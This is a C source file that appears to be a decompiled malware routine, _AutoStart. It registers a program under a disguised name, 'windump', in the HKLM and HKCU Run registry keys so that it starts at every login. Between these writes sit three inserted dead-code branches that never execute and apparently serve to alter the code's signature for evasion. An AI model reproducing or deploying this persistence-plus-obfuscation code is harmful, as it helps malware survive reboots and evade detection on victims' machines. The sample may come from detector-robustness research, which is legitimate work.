#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>   // <-- added for strlen()
#include <stdlib.h>   // added for malloc/free

void _AutoStart(BYTE *param_1)
{
    LSTATUS LVar1;
    DWORD DVar2;
    HKEY local_10[3];   // can be simplified to HKEY local_10; but keep as is to minimize changes

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            // discard
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    LVar1 = RegOpenKeyExA((HKEY)0x80000002, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }

    // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char *tmp = (char *)malloc(64);
        if (tmp != NULL) {
            strcpy(tmp, "dummy");
            volatile DWORD len = strlen(tmp);
            volatile BYTE check = 0;
            for (volatile DWORD i = 0; i < len; i++) {
                check ^= tmp[i];
            }
            volatile DWORD j = 0;
            while (j < 2) {
                check += j;
                j++;
            }
            free(tmp);
        }
    }

    LVar1 = RegOpenKeyExA((HKEY)0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], "windump", 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        // discard
        memset(dummy_array, 0, sizeof(dummy_array));
    }
}
